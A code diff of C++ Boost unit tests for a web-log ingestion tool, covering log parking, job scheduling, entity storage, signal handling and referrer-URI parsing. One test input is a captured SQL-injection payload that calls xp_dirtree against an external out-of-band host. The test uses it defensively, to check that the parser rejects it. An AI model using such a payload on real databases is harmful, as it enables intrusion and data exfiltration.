-				"android-app://com.google.android.googlequicksearchbox/",
-		}),
-		uri)
-{
-	BOOST_CHECK(!Ingestor::decomposeReferrer(uri));
-}
+	BOOST_AUTO_TEST_CASE(ParkLogLineOnError, *boost::unit_test::depends_on("I/ParkLogLine"))
+	{
+		BOOST_REQUIRE(existingEntities->empty());
+		static constexpr std::string UNPARSABLE_LINE = "UNPARSABLE";
+		BOOST_REQUIRE_NO_THROW(ingestLogLines(dbpool->get().get(), {&UNPARSABLE_LINE, 1}));
+		BOOST_CHECK_EQUAL(stats.linesParseFailed, 1);
+		BOOST_CHECK(existingEntities->empty());
+	}
 
-BOOST_DATA_TEST_CASE(DecomposeReferrerUri,
-		boost::unit_test::data::make<DecomposeUriData>({
-				{"https://www.example.com", "https", "www.example.com", "", std::nullopt, "https://www.example.com"},
-				{"https://www.example.com/", "https", "www.example.com", "/", std::nullopt, "https://www.example.com/"},
-				{"https://www.example.com?q=s", "https", "www.example.com", "", "q=s", "https://www.example.com?q=s"},
-				{"https://john.doe@www.example.com:1234/forum/questions/?tag=networking&order=newest#top", "https",
-						"www.example.com", "/forum/questions/", "tag=networking&order=newest",
-						"https://www.example.com/forum/questions/?tag=networking&order=newest"},
-				{"HtTp://TeSt.com/pAth?Query=String", "http", "TeSt.com", "/pAth", "Query=String",
-						"http://TeSt.com/pAth?Query=String"},
-		}),
-		uri, scheme, host, path, querystring, recomposedUri)
-{
-	using WebStat::operator/;
+	BOOST_AUTO_TEST_CASE(IngestParked, *boost::unit_test::depends_on("I/ParkLogLine"))
+	{
+		queuedLines.emplace_back(LOGLINE1);
+		queuedLines.emplace_back(LOGLINE2);
+		BOOST_REQUIRE(parkLogLines(queuedLines));
+		BOOST_CHECK(!std::filesystem::is_empty(settings.fallbackDir));
+		BOOST_REQUIRE(queuedLines.empty());
+		const auto result = jobReadParkedLines();
+		BOOST_REQUIRE(result);
+		BOOST_CHECK_EQUAL(result(), 2);
+		BOOST_CHECK_EQUAL(queuedLines.size(), 2);
+		BOOST_CHECK(std::filesystem::is_empty(settings.fallbackDir));
+	}
 
-	const auto decomposedUri = Ingestor::decomposeReferrer(uri);
-	BOOST_REQUIRE(decomposedUri);
-	const auto [duScheme, duHost, duPath, duQueryString] = *decomposedUri;
-	BOOST_CHECK_EQUAL(duScheme, scheme);
-	BOOST_CHECK_EQUAL(duHost.value, host);
-	BOOST_CHECK_EQUAL(duPath.value, path);
-	BOOST_CHECK_EQUAL(duQueryString / &Entity::value, querystring);
+	BOOST_AUTO_TEST_CASE(DefaultLaunchNoJobs)
+	{
+		runJobsAsNeeded();
+		BOOST_REQUIRE(!ingestParkedLines.currentRun);
+		BOOST_REQUIRE(!purgeOldLogs.currentRun);
+	}
 
-	auto dbconn = DB::MockDatabase::openConnectionTo("webstat");
-	auto select = dbconn->select("SELECT compose_uri(?, ?, ?, ?)");
-	bindMany(select, 0, scheme, host, path, querystring);
-	BOOST_REQUIRE(select->fetch());
-	std::string recomposed;
-	(*select)[0] >> recomposed;
-	BOOST_CHECK_EQUAL(recomposed, recomposedUri);
-}
+	BOOST_AUTO_TEST_CASE(IngestParkedJob,
+			*boost::unit_test::depends_on("I/IngestParked") * boost::unit_test::depends_on("I/DefaultLaunchNoJobs"))
+	{
+		const auto now = Job::LastRunTime::clock::now();
+		ingestParkedLines.lastRun = now - 1s;
+		queuedLines.emplace_back(LOGLINE1);
+		const auto path = parkLogLines(queuedLines);
+		BOOST_REQUIRE(path);
+		BOOST_REQUIRE(queuedLines.empty());
+		BOOST_REQUIRE(std::filesystem::exists(*path));
 
-BOOST_DATA_TEST_CASE(DecomposeReferrerUriMix,
-		boost::unit_test::data::make<std::string>("http", "https", "ftp", "foo-bar")
-				* boost::unit_test::data::make<std::string>("short", "example.com", "www.example.com", "www.foo-bar.jk")
-				* boost::unit_test::data::make<std::string>("", "/", "/path", "/path/to/thing")
-				* boost::unit_test::data::make<std::string>("", "?", "?q=s", "?query=string&foo=bar"),
-		scheme, host, path, queryString)
-{
-	const auto fullUri = scheme + "://" + host + path + queryString;
-	BOOST_TEST_INFO(fullUri);
-	BOOST_CHECK(Ingestor::decomposeReferrer(fullUri));
+		runJobsAsNeeded();
+		BOOST_REQUIRE(!ingestParkedLines.currentRun);
+		BOOST_CHECK(queuedLines.empty());
+		BOOST_CHECK(std::filesystem::exists(*path));
+		BOOST_CHECK_EQUAL(ingestParkedLines.lastRun, now - 1s);
+
+		ingestParkedLines.lastRun = now - settings.freqIngestParkedLines + 2s;
+		runJobsAsNeeded();
+		BOOST_REQUIRE(!ingestParkedLines.currentRun);
+		BOOST_CHECK(queuedLines.empty());
+		BOOST_CHECK(std::filesystem::exists(*path));
+		BOOST_CHECK_EQUAL(ingestParkedLines.lastRun, now - settings.freqIngestParkedLines + 2s);
+
+		ingestParkedLines.lastRun = now - settings.freqIngestParkedLines - 1s;
+		runJobsAsNeeded();
+		BOOST_REQUIRE(ingestParkedLines.currentRun);
+		ingestParkedLines.currentRun.value().wait();
+		runJobsAsNeeded();
+		BOOST_REQUIRE(!ingestParkedLines.currentRun);
+		BOOST_CHECK_EQUAL(queuedLines.size(), 1);
+		BOOST_CHECK_GE(ingestParkedLines.lastRun, now);
+		BOOST_CHECK(!std::filesystem::exists(*path));
+	}
+
+	BOOST_AUTO_TEST_CASE(JobErrorRescheduler, *boost::unit_test::depends_on("I/IngestParkedJob"))
+	{
+		const auto now = Job::LastRunTime::clock::now();
+		ingestParkedLines.lastRun = now - settings.freqIngestParkedLines - 1s;
+		queuedLines.emplace_back(LOGLINE1);
+		const auto path = parkLogLines(queuedLines);
+		BOOST_REQUIRE(path);
+		std::filesystem::permissions(*path, std::filesystem::perms::owner_write);
+		runJobsAsNeeded();
+		BOOST_REQUIRE(ingestParkedLines.currentRun);
+		ingestParkedLines.currentRun.value().wait();
+		runJobsAsNeeded();
+		BOOST_REQUIRE(!ingestParkedLines.currentRun);
+		BOOST_CHECK(std::filesystem::exists(*path));
+		BOOST_CHECK_GE(ingestParkedLines.lastRun, now - (settings.freqIngestParkedLines / 2) - 1s);
+		BOOST_CHECK_LE(ingestParkedLines.lastRun, now - (settings.freqIngestParkedLines / 2) + 1s);
+	}
+
+	BOOST_AUTO_TEST_CASE(FetchMockUserAgentDetail)
+	{
+		const auto uaDetailReq = WebStat::curlGetUserAgentDetail(0,
+				R"(Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36)",
+				settings.userAgentAPI.c_str());
+		BOOST_REQUIRE(uaDetailReq);
+		BOOST_REQUIRE_EQUAL(CURLE_OK, curl_easy_perform(uaDetailReq->hnd.get()));
+
+		BOOST_TEST_CONTEXT(uaDetailReq->result) {
+			BOOST_CHECK(uaDetailReq->result.contains(R"("agent_type":)"));
+			BOOST_CHECK(uaDetailReq->result.contains(R"("os_type":)"));
+			BOOST_CHECK(uaDetailReq->result.contains(R"("Chrome")"));
+		}
+	}
+
+	constexpr EntityId ROLLING_ENTITY_COUNTER_BASE = 15;
+
+	BOOST_AUTO_TEST_CASE(RecordUnparsable)
+	{
+		queuedLines.emplace_back("does not parse");
+		const auto job = beginIngestQueuedLogLines();
+		BOOST_REQUIRE(storeQueueLines.currentRun);
+		BOOST_CHECK_EQUAL(&job.first, &storeQueueLines.currentRun.value());
+		BOOST_CHECK(job.second);
+		finishAllJobs();
+		const auto dbconn = dbpool->get();
+		const auto select = dbconn->select(
+				R"(SELECT id::bigint, value, detail ? 'timestamp' has_ts, (detail->>'hostnameId')::int hostnameId
+			FROM entities
+			WHERE type = 'unparsable_line')");
+		static constexpr std::array<std::tuple<EntityId, std::string_view, bool, uint32_t>, 1> EXPECTED {
+				{
+						{ROLLING_ENTITY_COUNTER_BASE, "does not parse", true, 1},
+				},
+		};
+		const auto rows = select->as<EntityId, std::string_view, bool, uint32_t>();
+		BOOST_CHECK_EQUAL_COLLECTIONS(rows.begin(), rows.end(), EXPECTED.begin(), EXPECTED.end());
+		BOOST_CHECK_EQUAL(stats.linesParsed, 0);
+		BOOST_CHECK_EQUAL(stats.linesParseFailed, 1);
+		BOOST_CHECK_EQUAL(stats.entitiesInserted, 0);
+		BOOST_CHECK(existingEntities->empty()); // Don't clutter existing entities with junk logs
+	}
+
+	BOOST_AUTO_TEST_CASE(RecordUninsertable)
+	{
+		const auto dbconn = dbpool->get();
+		{ // Part 1: bad HTTP verb causes insert failure after storing entities
+			constexpr std::string_view LOGLINE_UNINSERTABLE
+					= R"LOG(git.randomdan.homeip.net 98.82.40.168 1755561576768319 CAUSEINSERTFAIL "/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest" "?h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714" HTTP/1.1 200 1884 107791 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36" "text/plain")LOG";
+			queuedLines.emplace_back(LOGLINE_UNINSERTABLE);
+			{
+				// This run fails
+				const auto job = beginIngestQueuedLogLines();
+				BOOST_REQUIRE(storeQueueLines.currentRun);
+				BOOST_CHECK_EQUAL(&job.first, &storeQueueLines.currentRun.value());
+				BOOST_CHECK(job.second);
+				finishAllJobs();
+				BOOST_REQUIRE_EQUAL(stats.batchesStarted, 1);
+				BOOST_REQUIRE_EQUAL(stats.batchesCompleted, 0);
+				BOOST_REQUIRE(previousIngestErrored);
+			}
+			{
+				// Try it again...
+				const auto job = beginIngestQueuedLogLines();
+				BOOST_REQUIRE(storeQueueLines.currentRun);
+				BOOST_CHECK_EQUAL(&job.first, &storeQueueLines.currentRun.value());
+				BOOST_CHECK(job.second);
+				finishAllJobs();
+				BOOST_REQUIRE_EQUAL(stats.batchesStarted, 2);
+				BOOST_REQUIRE_EQUAL(stats.batchesCompleted, 1);
+				BOOST_REQUIRE(!previousIngestErrored);
+			}
+			const auto select = dbconn->select(
+					R"(SELECT id::bigint, value, detail ? 'timestamp' has_ts, (detail->>'hostnameId')::int hostnameId, (detail->>'error')::text
+			FROM entities
+			WHERE type = 'uninsertable_line')");
+			constexpr std::array<std::tuple<EntityId, std::string_view, bool, uint32_t, std::string_view>, 1> EXPECTED {
+					{
+							{
+									ROLLING_ENTITY_COUNTER_BASE + 5,
+									LOGLINE_UNINSERTABLE,
+									true,
+									1,
+									"ERROR:  invalid input value for enum http_verb: \"CAUSEINSERTFAIL\"\n"
+									"CONTEXT:  unnamed portal parameter $5 = '...'\n",
+							},
+					},
+			};
+			const auto rows = select->as<EntityId, std::string_view, bool, uint32_t, std::string_view>();
+			BOOST_CHECK_EQUAL_COLLECTIONS(rows.begin(), rows.end(), EXPECTED.begin(), EXPECTED.end());
+			BOOST_CHECK_EQUAL(stats.linesParsed, 2);
+			BOOST_CHECK_EQUAL(stats.logsInserted, 0);
+			BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
+			BOOST_CHECK_EQUAL(stats.entitiesInserted, 10); // 5 were inserted, twice, but the savepoint was rolled back
+			BOOST_CHECK(existingEntities->empty()); // ... so existing entities should be empty
+		}
+
+		{ // Part 2: corrected HTTP verb allows insert, requires that the entities are re-stored
+			constexpr std::string_view LOGLINE_UNINSERTABLE_GET
+					= R"LOG(git.randomdan.homeip.net 98.82.40.168 1755561576768320 GET "/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest" "?h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714" HTTP/1.1 200 1884 107791 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36" "text/plain")LOG";
+			queuedLines.emplace_back(LOGLINE_UNINSERTABLE_GET);
+			{
+				const auto job = beginIngestQueuedLogLines();
+				BOOST_REQUIRE(storeQueueLines.currentRun);
+				BOOST_CHECK_EQUAL(&job.first, &storeQueueLines.currentRun.value());
+				BOOST_CHECK(job.second);
+				finishAllJobs();
+			}
+			BOOST_CHECK_EQUAL(stats.linesParsed, 3);
+			BOOST_CHECK_EQUAL(stats.logsInserted, 1);
+			BOOST_CHECK_EQUAL(stats.entitiesInserted, 15);
+			BOOST_CHECK_EQUAL(existingEntities->size(), 5);
+		}
+	}
+
+	BOOST_AUTO_TEST_CASE(PurgeOldJob)
+	{
+		BOOST_CHECK_EQUAL(3, jobPurgeOldLogs()());
+	}
+
+	BOOST_AUTO_TEST_CASE(RetryUninsertableNone, *boost::unit_test::timeout(1))
+	{
+		BOOST_CHECK_EQUAL(0, jobRetryUninsertableLines()());
+	}
+
+	BOOST_AUTO_TEST_CASE(RetryUninsertableSuccess, *boost::unit_test::timeout(1))
+	{
+		const auto dbconn = dbpool->get();
+		const auto uninsertableLineId = storeUninsertableLine(
+				dbconn.get(), getHostnameId(dbconn.get()), LOGLINE1, std::runtime_error {"some error"});
+		BOOST_REQUIRE(getEntityById(dbconn.get(), uninsertableLineId));
+
+		BOOST_CHECK_EQUAL(1, jobRetryUninsertableLines()());
+		BOOST_REQUIRE(!getEntityById(dbconn.get(), uninsertableLineId));
+	}
+
+	BOOST_AUTO_TEST_CASE(RetryUninsertableNowUnparsable, *boost::unit_test::timeout(1))
+	{
+		const auto dbconn = dbpool->get();
+		const auto uninsertableId = storeUninsertableLine(
+				dbconn.get(), getHostnameId(dbconn.get()), "blah", std::runtime_error {"some error"});
+		BOOST_REQUIRE(uninsertableId);
+
+		BOOST_CHECK_EQUAL(0, jobRetryUninsertableLines()());
+		const auto updatedEntity = getEntityById(dbconn.get(), uninsertableId);
+		BOOST_REQUIRE(updatedEntity);
+		BOOST_CHECK_EQUAL(std::get<1>(updatedEntity.value()), EntityType::UnparsableLine);
+	}
+
+	BOOST_AUTO_TEST_CASE(RetryUninsertableStillUninsertable, *boost::unit_test::timeout(1))
+	{
+		const auto dbconn = dbpool->get();
+		constexpr std::string_view LOGLINE_UNINSERTABLE
+				= R"LOG(git.randomdan.homeip.net 98.82.40.168 1755561576768318 CAUSEINSERTFAIL "/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest" "?h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714" HTTP/1.1 200 1884 107791 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36" "text/plain")LOG";
+		const auto uninsertableId = storeUninsertableLine(
+				dbconn.get(), getHostnameId(dbconn.get()), LOGLINE_UNINSERTABLE, std::runtime_error {"some error"});
+		BOOST_REQUIRE(uninsertableId);
+
+		BOOST_CHECK_EQUAL(0, jobRetryUninsertableLines()());
+		const auto updatedEntity = getEntityById(dbconn.get(), uninsertableId);
+		BOOST_REQUIRE(updatedEntity);
+		BOOST_CHECK_EQUAL(std::get<1>(updatedEntity.value()), EntityType::UninsertableLine);
+		const auto & detail = std::get<3>(updatedEntity.value()).value();
+
+		BOOST_TEST_CONTEXT(detail) {
+			BOOST_CHECK(detail.starts_with('{'));
+			BOOST_CHECK(detail.contains("invalid input value for enum http_verb"));
+			BOOST_CHECK(detail.contains("retriedAt"));
+			BOOST_CHECK(detail.ends_with('}'));
+		}
+	}
+
+	BOOST_AUTO_TEST_CASE(LogStatsSignal)
+	{
+		BOOST_REQUIRE_EQUAL(logsWritten, 0);
+		raise(SIGUSR1);
+		BOOST_CHECK_EQUAL(logsWritten, 1);
+	}
+
+	BOOST_AUTO_TEST_CASE(LogResetSignal)
+	{
+		stats = {
+				.linesRead = 1,
+				.linesParsed = 2,
+				.linesParseFailed = 3,
+				.logsInserted = 4,
+				.linesParked = 5,
+				.entitiesInserted = 6,
+				.batchesStarted = 7,
+				.batchesCompleted = 8,
+		};
+		raise(SIGUSR2);
+		BOOST_CHECK_EQUAL(stats, Stats {});
+	}
+
+	using CreateEntitiesData = std::tuple<std::string_view, WebStat::EntityType, int>;
+
+	constexpr int ENTITY_OFFSET_HOST1 = 14, ENTITY_OFFSET_HOST2 = ENTITY_OFFSET_HOST1 + 1,
+				  ENTITY_OFFSET_HOST3 = ENTITY_OFFSET_HOST2 + 1, ENTITY_OFFSET_V_HOST1 = ENTITY_OFFSET_HOST3 + 1,
+				  ENTITY_OFFSET_V_HOST2 = ENTITY_OFFSET_V_HOST1 + 1, ENTITY_OFFSET_V_HOST3 = ENTITY_OFFSET_V_HOST2 + 1;
+
+	BOOST_DATA_TEST_CASE(CreateEntities,
+			boost::unit_test::data::make<CreateEntitiesData>({
+					{"host1", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST1},
+					{"host2", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST2},
+					{"host3", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST3},
+					{"host1", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST1},
+					{"host2", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST2},
+					{"host3", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST3},
+					{"host1", WebStat::EntityType::VirtualHost, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_V_HOST1},
+					{"host2", WebStat::EntityType::VirtualHost, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_V_HOST2},
+					{"host3", WebStat::EntityType::VirtualHost, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_V_HOST3},
+					{"host1", WebStat::EntityType::VirtualHost, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_V_HOST1},
+					{"host2", WebStat::EntityType::VirtualHost, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_V_HOST2},
+					{"host3", WebStat::EntityType::VirtualHost, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_V_HOST3},
+					{"host2", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST2},
+					{"host1", WebStat::EntityType::VirtualHost, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_V_HOST1},
+					{"host3", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST3},
+					{"host1", WebStat::EntityType::Host, ROLLING_ENTITY_COUNTER_BASE + ENTITY_OFFSET_HOST1},
+			}),
+			value, type, expectedId)
+	{
+		const auto dbc = dbpool->get();
+		const auto entityInsert = dbc->select(WebStat::SQL::ENTITY_INSERT, WebStat::SQL::ENTITY_INSERT_OPTS);
+		entityInsert->bindParamS(0, value);
+		entityInsert->bindParamS(1, ENTITY_TYPE_VALUES.at(std::to_underlying(type)));
+		BOOST_REQUIRE_NO_THROW(entityInsert->execute());
+		size_t rows = 0;
+		for (auto [entityId, detailIsNull] : entityInsert->as<int, bool>()) {
+			++rows;
+			BOOST_REQUIRE_EQUAL(rows, 1);
+			BOOST_CHECK_EQUAL(entityId, expectedId);
+			BOOST_CHECK_EQUAL(detailIsNull, true);
+		}
+	}
+
+	BOOST_AUTO_TEST_CASE(TerminateMidIngest, *boost::unit_test::timeout(5))
+	{
+		settings.maxBatchSize = 64;
+		queuedLines.append_range(std::views::repeat(std::string {LOGLINE1}, 1000));
+		beginIngestQueuedLogLines();
+		std::this_thread::sleep_for(std::chrono::milliseconds {100});
+		raise(SIGTERM);
+		finishAllJobs();
+		BOOST_CHECK_EQUAL(stats.linesRead, 0); // We appended directly
+		// Some progress was made
+		BOOST_CHECK_GT(stats.linesParsed, 0);
+		BOOST_CHECK_GT(stats.logsInserted, 0);
+		BOOST_TEST_INFO(processingLines.size());
+		BOOST_CHECK_EQUAL(processingLines.size(), 1000 - (settings.maxBatchSize * stats.batchesCompleted));
+		// Progress was interrupted
+		BOOST_CHECK_GE(stats.logsInserted, (settings.maxBatchSize * stats.batchesCompleted));
+		BOOST_CHECK_LT(stats.logsInserted, settings.maxBatchSize * (stats.batchesCompleted + 1));
+		BOOST_CHECK_GT(processingLines.size(), 0);
+
+		BOOST_CHECK(queuedLines.empty());
+	}
+
+	BOOST_AUTO_TEST_SUITE_END();
+
+	BOOST_AUTO_TEST_CASE(FetchRealUserAgentDetail, *boost::unit_test::disabled())
+	{
+		const auto uaDetailReq = WebStat::curlGetUserAgentDetail(0,
+				R"(Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36)",
+				"http://useragentstring.com");
+		BOOST_REQUIRE(uaDetailReq);
+		BOOST_REQUIRE_EQUAL(CURLE_OK, curl_easy_perform(uaDetailReq->hnd.get()));
+
+		BOOST_TEST_CONTEXT(uaDetailReq->result) {
+			BOOST_CHECK(uaDetailReq->result.starts_with('{'));
+			BOOST_CHECK(uaDetailReq->result.ends_with('}'));
+			BOOST_CHECK(uaDetailReq->result.contains(R"("agent_type":)"));
+			BOOST_CHECK(uaDetailReq->result.contains(R"("os_type":)"));
+		}
+	}
+
+	using DecomposeUriData = std::tuple<std::string_view, std::string_view, std::string_view, std::string_view,
+			std::optional<std::string_view>, std::string_view>;
+
+	BOOST_DATA_TEST_CASE(DecomposeReferrerUriBad,
+			boost::unit_test::data::make<std::string_view>({
+					"",
+					"not a uri",
+					"www.google.com",
+					"www.google.com/",
+					"www.google.com/path",
+					R"(http://portage.randomdan.homeip.net/');declare @q varchar(99);set @q='\\mh7bick2533bv3lybfcok0vwangg48szlnga7yw.oasti'+'fy.com\tqa'; exec master.dbo.xp_dirtree @q;--)",
+					"android-app://com.google.android.googlequicksearchbox/",
+			}),
+			uri)
+	{
+		BOOST_CHECK(!Ingestor::decomposeReferrer(uri));
+	}
+
+	BOOST_DATA_TEST_CASE(DecomposeReferrerUri,
+			boost::unit_test::data::make<DecomposeUriData>({
+					{"https://www.example.com", "https", "www.example.com", "", std::nullopt,
+							"https://www.example.com"},
+					{"https://www.example.com/", "https", "www.example.com", "/", std::nullopt,
+							"https://www.example.com/"},
+					{"https://www.example.com?q=s", "https", "www.example.com", "", "q=s",
+							"https://www.example.com?q=s"},
+					{"https://john.doe@www.example.com:1234/forum/questions/?tag=networking&order=newest#top", "https",
+							"www.example.com", "/forum/questions/", "tag=networking&order=newest",
+							"https://www.example.com/forum/questions/?tag=networking&order=newest"},
+					{"HtTp://TeSt.com/pAth?Query=String", "http", "TeSt.com", "/pAth", "Query=String",
+							"http://TeSt.com/pAth?Query=String"},
+			}),
+			uri, scheme, host, path, querystring, recomposedUri)
+	{
+		using WebStat::operator/;
+
+		const auto decomposedUri = Ingestor::decomposeReferrer(uri);
+		BOOST_REQUIRE(decomposedUri);
+		const auto [duScheme, duHost, duPath, duQueryString] = decomposedUri.value();
+		BOOST_CHECK_EQUAL(duScheme, scheme);
+		BOOST_CHECK_EQUAL(duHost.value, host);
+		BOOST_CHECK_EQUAL(duPath.value, path);
+		BOOST_CHECK_EQUAL(duQueryString / &Entity::value, querystring);
+
+		const auto dbconn = DB::MockDatabase::openConnectionTo("webstat");
+		const auto select = dbconn->select("SELECT compose_uri(?, ?, ?, ?)");
+		bindMany(select, 0, scheme, host, path, querystring);
+		const auto rowRange = select->as<std::string>();
+
+		auto expected = std::views::single(std::make_tuple(recomposedUri));
+		BOOST_CHECK_EQUAL_COLLECTIONS(rowRange.begin(), rowRange.end(), expected.begin(), expected.end());
+	}
+
+	BOOST_DATA_TEST_CASE(DecomposeReferrerUriMix,
+			boost::unit_test::data::make<std::string>("http", "https", "ftp", "foo-bar")
+					* boost::unit_test::data::make<std::string>(
+							"short", "example.com", "www.example.com", "www.foo-bar.jk")
+					* boost::unit_test::data::make<std::string>("", "/", "/path", "/path/to/thing")
+					* boost::unit_test::data::make<std::string>("", "?", "?q=s", "?query=string&foo=bar"),
+			scheme, host, path, queryString)
+	{
+		const auto fullUri = scheme + "://" + host + path + queryString;
+		BOOST_TEST_INFO(fullUri);
+		BOOST_CHECK(Ingestor::decomposeReferrer(fullUri));
+	}
 }
